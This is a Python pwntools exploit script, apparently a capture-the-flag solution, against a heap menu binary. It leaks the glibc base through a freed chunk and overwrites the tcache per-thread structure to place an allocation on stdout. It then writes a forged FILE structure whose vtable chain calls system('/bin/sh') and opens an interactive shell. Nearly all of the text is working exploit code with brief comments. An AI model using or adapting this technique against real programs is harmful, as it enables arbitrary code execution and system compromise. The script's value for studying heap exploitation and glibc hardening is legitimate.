from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal_patched', '''
    continue
''')

# malloc a chunk at index (0-1) of size with data
def allocate(index, size, data):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"idx?: ", str(index).encode())
    p.sendlineafter(b"size?: ", str(size).encode())
    p.sendafter(b"data?: ", data)

# view data of a chunk at index (0-1)
def view(index):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"idx?: ", str(index).encode())
    p.recvuntil(b"meow: ")
    return p.recvuntil(b"1. ", drop=True)

# free a chunk at index (0-1)
def free(index):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"idx?: ", str(index).encode())

# edit data of a chunk at index (0-1)
def edit(index, data):
    p.sendlineafter(b"> ", b'4')
    p.sendlineafter(b"idx?: ", str(index).encode())
    p.sendafter(b"data?: ", data)

glibc_e = ELF('./libc.so.6')

# Stage 1: leak glibc base address
# chunk for leak
allocate(0, 0x418, b'0') # heap_base_addr+0x10
# avoid consolidation
allocate(1, 0x418, b'1') # heap_base_addr+0x430
# place glibc address at heap_base_addr+0x10 and heap_base_addr+0x18
free(0) # heap_base_addr+0x10
# leak glibc address
leaks = view(0) # heap_base_addr+0x10
glibc_base_addr = u64(leaks[0:8])-0x211b20
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# Stage 2: tcache perthread struct exploit to attack stdout for fsop
# make room for new chunk
free(1) # heap_base_addr+0x430
# initialize tcache per thread struct (glibc 2.42 feature) at heap_base_addr+0x10
allocate(1, 0x18, b'1') # heap_base_addr+0x310
# fake tcache per thread struct
class TcachePerthreadStruct:
    def __init__(self):
        self.counts = [7]*76
        self.pointers = [0]*76
    def set_count(self, size, count):
        idx = (size - 0x20) // 16
        self.counts[idx] = count
    def set_pointer(self, size, pointer):
        idx = (size - 0x20) // 16
        self.pointers[idx] = pointer
    def set(self, size, pointer, count=6):
        self.set_pointer(size, pointer)
        self.set_count(size, count)
    def __bytes__(self):
        output = b""
        for count in self.counts:
            output += p16(count)
        for pointer in self.pointers:
            output += p64(pointer)
        return output
fake_tcache = TcachePerthreadStruct()
fake_tcache.set(0x100, glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])
# overwrite tcache per thread struct with fake one at heap_base_addr+0x10
edit(0, bytes(fake_tcache)) # heap_base_addr+0x10
# fake file structure with execution flow of puts->_IO_wfile_underflow->__libio_codecvt_in
fake_file = FileStructure(0)
fake_file.flags = 0x3b01010101010101
fake_file._IO_read_end = glibc_base_addr+glibc_e.sym.system
fake_file._IO_buf_base = u64(b'/bin/sh\x00')
fake_file._IO_backup_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
fake_file._lock = glibc_base_addr+0x213790
fake_file._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
fake_file._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
fake_file.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x28)+p64(0)*3
fake_file.vtable = glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18
# overwrite stdout with fake one at glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']
allocate(1, 0xf8, bytes(fake_file)) # glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']

p.interactive()